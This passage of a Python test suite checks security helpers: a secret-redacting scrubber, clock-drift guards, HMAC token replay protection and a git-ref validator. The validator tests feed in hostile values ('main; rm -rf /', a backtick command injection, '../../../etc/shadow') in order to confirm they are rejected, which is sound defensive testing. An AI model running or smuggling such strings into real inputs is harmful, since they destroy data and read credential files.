        assert main_audit.has_low_sat_72px_gate is True

        pass_front = subprocess.run(
            ["python3", "scripts/check-character-art-submission.py", "nahla", "--view", "front"],
            cwd=main_audit.path,
            capture_output=True,
            text=True,
        )
        block_rear = subprocess.run(
            ["python3", "scripts/check-character-art-submission.py", "nahla", "--view", "back-hair-silhouette"],
            cwd=main_audit.path,
            capture_output=True,
            text=True,
        )
        assert pass_front.returncode == 0 and "ELIGIBLE" in pass_front.stdout
        assert block_rear.returncode != 0 and "BLOCKED" in block_rear.stderr

    db_path = Path("/home/zen/.hermes/knowledge_compiler.db")
    if db_path.is_file():
        conn = sqlite3.connect(str(db_path))
        rows = conn.execute(
            "SELECT external_ref, evolution_decision, secondbrain_note_path FROM exogenous_entropy_ledger WHERE external_ref LIKE 'graydoom:codex-%'"
        ).fetchall()
        conn.close()
        assert len(rows) >= 2
        for _, decision, rel_note in rows:
            assert decision == "ADOPT_INTO_HARNESS"
            assert (Path("/home/zen/Obsidian/SecondBrain") / rel_note).is_file()


class TestAdversarialSecurityEnclave:
    """Empirical test suite for SovereignEntropyScrubber, TelemetryRingBuffer, ByzantineBoundedHLC, and SafeGitEnclave."""

    def test_scrubber_redacts_anthropic_and_google_keys_with_hash(self):
        from tools.hourly_digest_monitor import SovereignEntropyScrubber

        sample_input = (
            "Task failed on node-1 with token sk-ant-api03-abcdef1234567890abcdef1234567890 "
            "and backup AIzaSyD98765432101234567890123456789012"
        )
        scrubbed = SovereignEntropyScrubber.scrub(sample_input)

        assert "sk-ant-api03" not in scrubbed
        assert "AIzaSyD987654" not in scrubbed
        assert "[REDACTED_ANTHROPIC_KEY:" in scrubbed
        assert "[REDACTED_GOOGLE_API_KEY:" in scrubbed

    def test_telemetry_ring_buffer_strictly_bounds_memory_and_evicts(self):
        from tools.hourly_digest_monitor import TelemetryRingBuffer

        buffer = TelemetryRingBuffer(capacity=5)
        for i in range(12):
            buffer.append({"event_id": i, "metric": f"val_{i}"})

        assert len(buffer) == 5
        assert buffer.total_appended == 12
        assert buffer.eviction_count == 7

        remaining_ids = [item["event_id"] for item in buffer.drain_all()]
        assert remaining_ids == [7, 8, 9, 10, 11]
        assert len(buffer) == 0

    def test_byzantine_hlc_rejects_future_clock_drift_attack(self):
        from tools.hlc_clock_drift_guard import ByzantineBoundedHLC, HLCReading

        class MockClock:
            def __init__(self, init_time: int) -> None:
                self.curr = init_time

            def __call__(self) -> int:
                return self.curr

        clock = MockClock(1_000_000)
        hlc = ByzantineBoundedHLC(node_id="pro-1", clock_func=clock)

        malicious_reading = HLCReading(
            physical_ms=1_010_000,
            logical_counter=0,
            node_id="adversarial-node",
        )
        accepted, resulting_hlc, reason = hlc.update(malicious_reading)

        assert accepted is False
        assert "Byzantine drift detected" in reason
        assert resulting_hlc.physical_ms == 1_000_000
        assert resulting_hlc.logical_counter == 0

    def test_byzantine_hlc_accepts_valid_drift_and_increments_monotonically(self):
        from tools.hlc_clock_drift_guard import ByzantineBoundedHLC, HLCReading

        class MockClock:
            def __init__(self, init_time: int) -> None:
                self.curr = init_time

            def __call__(self) -> int:
                return self.curr

        clock = MockClock(1_000_000)
        hlc = ByzantineBoundedHLC(node_id="pro-1", clock_func=clock)

        valid_reading = HLCReading(
            physical_ms=1_001_500,
            logical_counter=4,
            node_id="node-4",
        )
        accepted, resulting_hlc, reason = hlc.update(valid_reading)
        assert accepted is True
        assert reason == "OK"
        assert resulting_hlc.physical_ms == 1_001_500
        assert resulting_hlc.logical_counter == 5

    def test_safe_git_enclave_rejects_command_injection_and_path_traversal(self):
        from tools.graydoom_codex_handoff_auditor import SafeGitEnclave

        with pytest.raises(ValueError, match="Malicious or invalid git reference detected"):
            SafeGitEnclave.validate_ref("main; rm -rf /")

        with pytest.raises(ValueError, match="Malicious or invalid git reference detected"):
            SafeGitEnclave.validate_ref("origin/main`touch pwn`")

        with pytest.raises(ValueError, match="Path traversal characters in git ref forbidden"):
            SafeGitEnclave.validate_ref("../../../etc/shadow")

        valid = SafeGitEnclave.validate_ref("origin/codex/settlement-art-mapping-20261015")
        assert valid == "origin/codex/settlement-art-mapping-20261015"

    def test_hlc_clock_guard_rejects_byzantine_forward_clock_skew(self) -> None:
        from tools.hlc_clock_drift_guard import ClockDriftExceededError, HLCClockGuard

        guard = HLCClockGuard(max_drift_ms=1500)
        now_ms = int(time.time() * 1000)

        valid_clock = guard.update(remote_physical_ms=now_ms + 1000, remote_logical=0)
        assert valid_clock.physical_time_ms >= now_ms + 1000
        assert valid_clock.logical_counter == 1

        with pytest.raises(ClockDriftExceededError) as exc_info:
            guard.update(remote_physical_ms=now_ms + 5000, remote_logical=0)
        assert "exceeds maximum tolerated threshold" in str(exc_info.value)

    def test_hlc_clock_guard_strict_monotonic_ordering_under_concurrent_ticks(self) -> None:
        from tools.hlc_clock_drift_guard import HLCClockGuard

        guard = HLCClockGuard(max_drift_ms=1500)
        fixed_now = int(time.time() * 1000) + 200

        clock_a = guard.update(remote_physical_ms=fixed_now, remote_logical=0)
        clock_b = guard.update(remote_physical_ms=fixed_now, remote_logical=1)
        clock_c = guard.update(remote_physical_ms=fixed_now, remote_logical=1)

        assert clock_a.logical_counter < clock_b.logical_counter
        assert clock_b.logical_counter < clock_c.logical_counter
        assert guard.verify_order(clock_a, clock_b) is True
        assert guard.verify_order(clock_b, clock_c) is True
        assert guard.verify_order(clock_c, clock_a) is False

    def test_stateless_token_replay_rejected_within_same_epoch(self) -> None:
        from tools.hourly_digest_monitor import StatelessTokenGuard

        secret = b"kdf_test_master_secret_32_bytes_len!!"
        token_guard = StatelessTokenGuard(master_secret=secret, epoch_duration_s=10)
        payload = {"node_id": "node-4", "action": "quota_deduct", "units": 5}
        current_time = 1729230000.0

        token = token_guard.generate_token(payload, timestamp_s=current_time)
        assert token_guard.validate_and_consume_token(payload, token, current_time) is True
        assert token_guard.validate_and_consume_token(payload, token, current_time) is False

    def test_stateless_token_rejects_tampered_payload_or_expired_epoch(self) -> None:
        from tools.hourly_digest_monitor import StatelessTokenGuard

        secret = b"kdf_test_master_secret_32_bytes_len!!"
        token_guard = StatelessTokenGuard(master_secret=secret, epoch_duration_s=10)
        payload = {"node_id": "node-4", "units": 5}
        t0 = 1729230000.0

        token = token_guard.generate_token(payload, timestamp_s=t0)
        tampered_payload = {"node_id": "node-4", "units": 999}
        assert token_guard.validate_and_consume_token(tampered_payload, token, t0) is False

        future_time = t0 + 35.0
        assert token_guard.validate_and_consume_token(payload, token, future_time) is False

    def test_silent_bit_flip_payload_corruption_detected_via_sha256(self) -> None:
        from tools.hourly_digest_monitor import StatelessTokenGuard

        secret = b"kdf_test_master_secret_32_bytes_len!!"
        token_guard = StatelessTokenGuard(master_secret=secret, epoch_duration_s=60)
        payload = {"node_id": "node-5", "fraction": 0.125}
        t0 = 1729230000.0

        valid_token = token_guard.generate_token(payload, t0)
        prefix, sig = valid_token.split(":")
        corrupted_char = "a" if sig[-1] != "a" else "b"
        corrupted_token = f"{prefix}:{sig[:-1]}{corrupted_char}"

        assert token_guard.validate_and_consume_token(payload, corrupted_token, t0) is False

    def test_insecure_or_short_master_secret_rejected(self) -> None:
        from tools.hourly_digest_monitor import SecurityConfigurationError, StatelessTokenEngine

        with pytest.raises(SecurityConfigurationError, match="at least 32 characters"):
            StatelessTokenEngine(master_secret="short_secret")

        with pytest.raises(SecurityConfigurationError, match="Insecure default"):
            StatelessTokenEngine(master_secret="secret                          ")

    def test_stateless_token_engine_replay_and_tamper_rejected(self) -> None:
        from tools.hourly_digest_monitor import StatelessTokenEngine, TokenReplayDetectedError

        engine = StatelessTokenEngine(master_secret="a" * 32, epoch_window_seconds=60)
        t_sim = 1700000000.0
        token, _ = engine.derive_epoch_token("GET", "/v1/r2/download", "nonce_alpha_123", timestamp=t_sim)

        assert engine.verify_token("GET", "/v1/r2/download", "nonce_alpha_123", token, timestamp=t_sim) is True

        with pytest.raises(TokenReplayDetectedError, match="Replay detected"):
            engine.verify_token("GET", "/v1/r2/download", "nonce_alpha_123", token, timestamp=t_sim + 1.0)

        token2, _ = engine.derive_epoch_token("POST", "/v1/r2/upload", "nonce_999", timestamp=t_sim)
        assert engine.verify_token("GET", "/v1/r2/upload", "nonce_999", token2, timestamp=t_sim) is False
        assert engine.verify_token("POST", "/v1/r2/other", "nonce_999", token2, timestamp=t_sim) is False

    def test_sovereign_hlc_guard_monotonic_and_backward_drift_bounds(self) -> None:
        from tools.hlc_clock_drift_guard import ClockDriftExceededError, SovereignHLCGuard

        guard = SovereignHLCGuard(max_drift_ms=250.0)
        base_phys = 1700000000500.0

        p1, l1 = guard.get_timestamp(physical_now_ms=base_phys)
        p2, l2 = guard.get_timestamp(physical_now_ms=base_phys)
        p3, l3 = guard.get_timestamp(physical_now_ms=base_phys - 150.0)

        assert (p1, l1) == (base_phys, 0)
        assert (p2, l2) == (base_phys, 1)
        assert (p3, l3) == (base_phys, 2)

        with pytest.raises(ClockDriftExceededError, match="backwards drift"):
            guard.get_timestamp(physical_now_ms=base_phys - 500.0)

    def test_hlc_shrinking_counterexample_engine_isolates_minimal_violation(self) -> None:
        from tools.hlc_clock_drift_guard import HLCShrinkingCounterexampleEngine, SovereignHLCGuard

        shrinker = HLCShrinkingCounterexampleEngine()
        trace = [
            (1000, 0, 0),
            (1001, 1000, 1),
            (1002, 1001, 0),
            (995, 1001, 2),
            (995, 1001, 1),
            (1003, 1002, 0),
        ]

        def buggy_clock_fn(wall: int, rem_p: int, rem_l: int):
            phys = max(wall, rem_p)
            logic = rem_l + 1 if phys == rem_p else 0
            return (phys, logic)

        assert shrinker.run_monotonicity_property(buggy_clock_fn, trace) is False
        minimal = shrinker.shrink_counterexample(buggy_clock_fn, trace)
        assert 2 <= len(minimal) < len(trace)
        assert shrinker.run_monotonicity_property(buggy_clock_fn, minimal) is False

        safe_guard = SovereignHLCGuard(max_drift_ms=250.0)
        assert shrinker.run_monotonicity_property(
            lambda w, _rp, _rl: safe_guard.get_timestamp(physical_now_ms=float(w)),
            [(1000, 0, 0), (1000, 0, 0), (995, 0, 0), (1002, 0, 0)],
        ) is True


